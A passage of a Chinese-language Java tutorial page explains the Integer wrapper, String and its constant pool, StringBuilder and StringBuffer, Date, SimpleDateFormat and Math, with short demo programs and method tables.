class="hljs">java.lang.Integer类被final关键字修饰表示该类不能被继承该类内部包装了一个int类型的变量作为该类的成员变量，实现int类型的包装</code></pre><p><strong>装箱和拆箱的概念</strong></p><pre><code class="hljs">装箱就是指从int类型向Integer类型的转换。拆箱就是指从Integer类型向int类型的转换。</code></pre><blockquote><p>从JDK1.5以后，编译器提供了自动拆箱和装箱的机制</p></blockquote><p><strong>常用方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>int intValue()</code></td><td>用于返回一个调用对象的int类型数据</td></tr><tr><td><code>float floatValue()</code></td><td>用于返回一个调用对象的float类型数据</td></tr><tr><td><code>static int parseInt(String str)</code></td><td>用于将参数指定的字符串转换成整数类型数据并返回</td></tr><tr><td><code>static String toBinaryString(int i)</code></td><td>用于将参数指定的int类型数据转换成字符串形式的二进制并返回</td></tr><tr><td><code>static Integer valueOf(Stirng str)</code></td><td>用于将参数指定的字符串转换为Integer对象</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str01</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;9527&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str02</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;9527acdc&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num01</span> <span class="hljs-operator">=</span> <span class="hljs-number">123</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">num02</span> <span class="hljs-operator">=</span> <span class="hljs-number">456</span>;<br><br>        <span class="hljs-comment">//intValue</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> num02.intValue();<br>        System.out.println(i);<br>        <span class="hljs-comment">//floatValue</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> num02.floatValue();<br>        System.out.println(v);<br>        <span class="hljs-comment">//parseInt</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> Integer.parseInt(str01);<br><span class="hljs-comment">//        int i1 = Integer.parseInt(str02);因为该方法不能将字母转换成int类型数据</span><br>        System.out.println(i1);<br>        <span class="hljs-comment">//toBinaryString</span><br>        System.out.println(Integer.toBinaryString(num01));<br>        <span class="hljs-comment">//valueOf</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">integer</span> <span class="hljs-operator">=</span> Integer.valueOf(str01);<br>        System.out.println(integer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="56d9a505"></a></p><h3 id="1-4-String类（重点）"><a href="#1-4-String类（重点）" class="headerlink" title="1.4 - String类（重点）"></a>1.4 - String类（重点）</h3><p><strong>基本概念</strong></p><p>java.lang.String类由final关键字修饰，表示该类不能被继承。</p><p>该类用于描述字符串，使用该类创建的对象可以描述Java中的所有字符串字面值，如：“asd”,”321”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">注意：<br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-comment">//没有对象</span><br>有何区别？？？？？？<br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//有对象，对象中没有内容</span><br></code></pre></td></tr></table></figure><p><strong>常用构造方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>String()</code></td><td>使用无参的形式来构造对象</td></tr><tr><td><code>String(byte[] bytes)</code></td><td>使用参数指定的字节数组来构造字符串</td></tr><tr><td><code>String(byte[] bytes, int offset, int length)</code></td><td>使用参数指定的字节数组的一部分来构造字符串</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  String类的构造方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<span class="hljs-comment">//创建空字符串</span><br>        System.out.println(str01);<br><br>        <span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">97</span>,<span class="hljs-number">98</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">102</span>,<span class="hljs-number">103</span>&#125;;<span class="hljs-comment">//初始化byte数组，存储的都是字符编码</span><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<span class="hljs-comment">//将整个byte数组转换成字符串</span><br><br>        <span class="hljs-comment">//将byte数组中的一部分内容转换成字符串</span><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="7d24fec3"></a></p><h5 id="字符串常量池"><a href="#字符串常量池" class="headerlink" title="字符串常量池"></a>字符串常量池</h5><pre><code class="hljs">Java为了避免产生大量相同的字符串对象，设计了字符串常量池，通过初始化的方式创建的字符串都会存储在常量池中，且字符串不能重复，以便共同使用，提高存储效率。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符串常量池</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//初始化方式创建字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str01</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello&quot;</span>;<span class="hljs-comment">//首次存储，先检查字符串常量池中是否存在相同对象的引用存在</span><br>                               <span class="hljs-comment">//没有，则创建对象，将当前对象的引用存储到字符串常量池中，并将引用返回给str01</span><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str02</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello&quot;</span>;<span class="hljs-comment">//再次存储，同样先检查字符串常量池中是否有相同对象的引用存在</span><br>                               <span class="hljs-comment">//有，则直接将字符串常量池中的对象引用返回给str02</span><br><br>        System.out.println(str01 == str02);<span class="hljs-comment">//  true</span><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<span class="hljs-comment">//构造的方式创建字符串</span><br><br>        System.out.println(str01 == str03);<span class="hljs-comment">//false</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="String类常用方法"><a href="#String类常用方法" class="headerlink" title="String类常用方法"></a>String类常用方法</h5><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>char charAt(int index)</code></td><td>用于返回调用对象指定参数位置的字符</td></tr><tr><td><code>int length()</code></td><td>用于返回字符串的长度</td></tr><tr><td><code>int compareTo(String anotherString)</code></td><td>表示按照字典顺序来比较两个字符串的大小</td></tr><tr><td><code>int compareToIgnoreCase(String str)</code></td><td>比较字符串大小，忽略大小写</td></tr><tr><td><code>boolean equals(Object anotherObject)</code></td><td>用于判断调用对象字符串和参数对象字符串内容是否相等</td></tr><tr><td><code>boolean equalsIgnoreCase(Object anotherObject)</code></td><td>判断字符串是否相等，忽略大小写</td></tr><tr><td><code>boolean contains(CharSequence s)</code></td><td>判断调用对象字符串中是否包含参数字符串</td></tr><tr><td><code>String concat(String str)</code></td><td>返回参数对象与调用对象的拼接</td></tr><tr><td><code>boolean endsWith(String suffix)</code></td><td>判断当前字符串是否以suffix为结尾</td></tr><tr><td><code>boolean startsWith(String prefix)</code></td><td>判断当前字符串是否以prefix开头</td></tr><tr><td><code>String toLowerCase()</code></td><td>用于将所有调用对象字符串都转换为小写</td></tr><tr><td><code>String toUpperCase()</code></td><td>用于将所有调用字符串对象转换为大写</td></tr><tr><td><code>byte[] getBytes()****</code><br>**</td><td>用于将字符串内容转换为byte数组并返回</td></tr><tr><td><code>int indexOf(String str)</code></td><td>用于查找指定参数第一次出现的下标，不存在则返回-1</td></tr><tr><td><code>int lastIndexOf(String str)</code></td><td>用于查找指定参数最后一次出现的下标。</td></tr><tr><td><code>String substring(int beginIndex)</code></td><td>用于获取从参数指定位置开始截取字符串并返回</td></tr><tr><td><code>String substring(int beginIndex,int endIndex)</code></td><td>用于获取从beginIndex位置开始到endIndex位置结束之间的字符串。</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符串常用方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str01</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello JavaSE&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str02</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello JavaSE&quot;</span>;<br><br>        <span class="hljs-comment">//返回字符串中指定位置的字符</span><br>        <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> str01.charAt(<span class="hljs-number">7</span>);<br>        System.out.println(c);<br><br>        <span class="hljs-comment">//返回字符串的长度</span><br>        System.out.println(str01.length());<br><br>        <span class="hljs-comment">//按照字典顺序比较两个字符串的大小</span><br>        System.out.println(str01.compareTo(str02));<br>        <span class="hljs-comment">//按照字典顺序比较两个字符串的大小,忽略大小写</span><br>        System.out.println(str01.compareToIgnoreCase(str02));<br><br>        <span class="hljs-comment">//该方法时String类内的成员方法，用来比较内容，与Object类中的equals方法不一样。</span><br>        System.out.println(str01.equals(str02));<br>        System.out.println(str01.equalsIgnoreCase(str02));<span class="hljs-comment">//true</span><br><br>        <span class="hljs-comment">//判断参数对象是否包含在调用对象中</span><br>        System.out.println(str01.contains(<span class="hljs-string">&quot;Java&quot;</span>));<span class="hljs-comment">//true</span><br>        System.out.println(str01.contains(<span class="hljs-string">&quot;java&quot;</span>));<span class="hljs-comment">//false  ，  Java严格区分大小写</span><br><br>        <span class="hljs-comment">//将调用对象与参数对象拼接的方法,将拼接完成的字符串直接返回</span><br>        System.out.println(str01.concat(<span class="hljs-string">&quot;!~~~&quot;</span>));<br><br>        <span class="hljs-comment">//判断是否以指定的字符串为结尾或者开头</span><br>        System.out.println(str01.endsWith(<span class="hljs-string">&quot;SE&quot;</span>));  <span class="hljs-comment">//true</span><br>        System.out.println(str01.startsWith(<span class="hljs-string">&quot;hello&quot;</span>));<span class="hljs-comment">//false</span><br><br>        <span class="hljs-comment">//将字符串转换为小写和大写</span><br>        System.out.println(str02.toLowerCase());<br>        System.out.println(str02.toUpperCase());<br><br>        <span class="hljs-comment">//将字符串转换成byte数组</span><br>        <span class="hljs-type">byte</span>[] bytes = str02.getBytes();<br>        <span class="hljs-comment">//直接打印数组引用，会打印数组在堆内存中的地址编号</span><br>        <span class="hljs-comment">//想直接查看数组中的内容，需要调用数组工具类Arrays中的toString方法</span><br>        System.out.println(Arrays.toString(bytes));<br><br>        <span class="hljs-comment">//查找参数对象在字符串中第一次和最后一次出现的位置</span><br>        System.out.println(str02.indexOf(<span class="hljs-string">&quot;a&quot;</span>));  <span class="hljs-comment">//7</span><br>        System.out.println(str02.lastIndexOf(<span class="hljs-string">&quot;a&quot;</span>));  <span class="hljs-comment">//9</span><br><br>        <span class="hljs-comment">//截取字符串</span><br>        System.out.println(str02.substring(<span class="hljs-number">6</span>));<br>        System.out.println(str02.substring(<span class="hljs-number">6</span>,<span class="hljs-number">10</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-5-String类与StringBuilder和StringBuffer区别"><a href="#1-5-String类与StringBuilder和StringBuffer区别" class="headerlink" title="1.5 - String类与StringBuilder和StringBuffer区别"></a>1.5 - String类与StringBuilder和StringBuffer区别</h3><pre><code class="hljs">String类型与StringBuilder、StringBuffer的区别主要在于String类构造的对象时不可变的，因此每次对String类型进行改变内容都相当于创建了一个新的对象，而StringBuilder与StringBuffer类的对象能够被多次修改的，并且不产生新的未使用的对象。</code></pre><table><thead><tr><th>类型</th><th>区别</th></tr></thead><tbody><tr><td><code>String</code></td><td>值不可变，修改就会创建新的对象，占用内存空间大</td></tr><tr><td><code>StringBuffer</code></td><td>值可变，不会创建新的对象，占用内存空间小，线程安全，速度慢，多线程</td></tr><tr><td><code>StringBuilder</code></td><td>值可变，不会创建新的对象，占用内存空间小，线程不安全，速度快，单线程</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  String类与StringBuilder和StringBuffer的区别</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//使用String类构造字符串对象</span><br><span class="hljs-comment">//        String str = new String(&quot;Hello&quot;);</span><br><span class="hljs-comment">//        String newStr = str + &quot; Java&quot;;</span><br><span class="hljs-comment">//        System.out.println(str == newStr);</span><br><br><br>        <span class="hljs-comment">//使用StringBuilder来构造字符串对象</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">newStr</span> <span class="hljs-operator">=</span> str.append(<span class="hljs-string">&quot; Java&quot;</span>);<br>        System.out.println(str == newStr);<span class="hljs-comment">//true</span><br>        <span class="hljs-comment">//打印对象</span><br>        System.out.println(str);<br>        System.out.println(newStr);<br>        <span class="hljs-comment">//在指定位置插入内容</span><br>        newStr.insert(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;SE&quot;</span>);<br>        System.out.println(str);<br>        <span class="hljs-comment">//替换字符串</span><br>        str.replace(<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-string">&quot;Linux&quot;</span>);<br>        System.out.println(newStr);<br>        <span class="hljs-comment">//删除指定位置的字符串</span><br>        str.delete(<span class="hljs-number">5</span>,<span class="hljs-number">11</span>);<br>        System.out.println(str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-6-日期相关类"><a href="#1-6-日期相关类" class="headerlink" title="1.6 - 日期相关类"></a>1.6 - 日期相关类</h3><h4 id="1-6-1-Date类"><a href="#1-6-1-Date类" class="headerlink" title="1.6.1 - Date类"></a>1.6.1 - Date类</h4><pre><code class="hljs">java.util.Date类用于描述日期信息，表示特定的瞬间可以精确到毫秒。</code></pre><p><strong>构造方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>Date()</code></td><td>构造方法用于使用当前系统日期来初始化对象</td></tr><tr><td><code>Date(long date)</code></td><td>构造方法根据参数指定的毫秒数来构造对象</td></tr></tbody></table><p><strong>常用方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>long getTime()</code></td><td>用于获取当前对象距离1970年1月1日0:0:0之间的毫秒数</td></tr><tr><td><code>void setTime(long time)</code></td><td>用于根据参数指定的毫秒数来设置时间</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Date类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<span class="hljs-comment">//获取当前系统时间来初始化Date对象</span><br>        System.out.println(date);<span class="hljs-comment">//打印时间对象</span><br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> date.getTime();<span class="hljs-comment">//获取从1970.1.1 0:0:0 距离当前调用对象共经历的多少毫秒</span><br>        System.out.println(time);<span class="hljs-comment">//打印共经历的多少毫秒</span><br>        <span class="hljs-comment">//需求：想要获取到去年的当前系统时间的date对象</span><br>        <span class="hljs-comment">//通过整体的时间减掉一年的毫秒数得到去年的当前时间毫秒数</span><br>        time = time - <span class="hljs-number">31536000000L</span>;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(time);<span class="hljs-comment">//构造去年的当前系统时间的Date对象</span><br>        System.out.println(date1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-6-2-SimpleDateFormat类"><a href="#1-6-2-SimpleDateFormat类" class="headerlink" title="1.6.2 - SimpleDateFormat类"></a>1.6.2 - SimpleDateFormat类</h4><p><strong>基本概念</strong></p><p>java.text.DimpleDateFormat类用于格式化日期，通俗来说就是调整时间显示的格式。</p><p><strong>常用方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>SimpleDateFormat(String pattern)</code></td><td>根据参数指定的格式来构造对象</td></tr><tr><td>参数格式</td><td>“yyyy-MM-dd HH:mm:ss”</td></tr><tr><td><code>public final String format(Date date)</code></td><td>用于将参数指定的日期对象按照调用调用对象的格式来转换成字符串形式</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  SimpleDateFormat类格式化时间</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<span class="hljs-comment">//构造当前系统时间的Date对象</span><br>        System.out.println(date);<br><br>        <span class="hljs-comment">//定义时间显示的格式</span><br>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> sdf.format(date);<span class="hljs-comment">//将参数对象按照调用对象的格式格式化时间并以字符串形式返回</span><br>        System.out.println(time);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-7-Math"><a href="#1-7-Math" class="headerlink" title="1.7 - Math"></a>1.7 - Math</h3><h4 id="1-7-1-基本概念"><a href="#1-7-1-基本概念" class="headerlink" title="1.7.1 - 基本概念"></a>1.7.1 - 基本概念</h4><pre><code class="hljs">Java中的Math包含了用于执行基本数学运算的属性和方法</code></pre><h4 id="1-7-2-常用方法"><a href="#1-7-2-常用方法" class="headerlink" title="1.7.2 - 常用方法"></a>1.7.2 - 常用方法</h4><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>static int abs(int a)</code></td><td>返回参数的绝对值</td></tr><tr><td><code>static double ceil(double a)</code></td><td>方法可以对一个数进行上舍入</td></tr><tr><td><code>static double floor(double a)</code></td><td>方法可以对一个数进行下舍入</td></tr><tr><td><code>static int round(double a)</code></td><td>返回一个四舍五入的值</td></tr><tr><td><code>static int min(int a , int b)</code></td><td>返回两个参数的最小值</td></tr><tr><td><code>static int max(int a, int b)</code></td><td>返回两个参数的最大值</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Math类中的常用方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n01</span> <span class="hljs-operator">=</span> -<span class="hljs-number">18</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n02</span> <span class="hljs-operator">=</span> <span class="hljs-number">21</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">d01</span> <span class="hljs-operator">=</span> <span class="hljs-number">3.4</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">d02</span> <span class="hljs-operator">=</span> <span class="hljs-number">3.5</span>;<br><br>        <span class="hljs-comment">//abs获取参数的绝对值</span><br>        System.out.println(Math.abs(n01));<br>        System.out.println(Math.abs(n02));<br><br>        <span class="hljs-comment">//四舍五入</span><br>        System.out.println(Math.round(d01));<br>        System.out.println(Math.round(d02));<br><br>        <span class="hljs-comment">//上舍入</span><br>        System.out.println(Math.ceil(d01));<br>        System.out.println(Math.ceil(d02));<br><br>        <span class="hljs-comment">//下舍入</span><br>        System.out.println(Math.floor(d01));<br>        System.out.println(Math.floor(d02));<br><br>        <span class="hljs-comment">//比较两个参数的最大值和最小值</span><br>        System.out.println(Math.min(n01,n02));<br>        System.out.println(Math.max(n01,n02));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-8-Scanner"><a 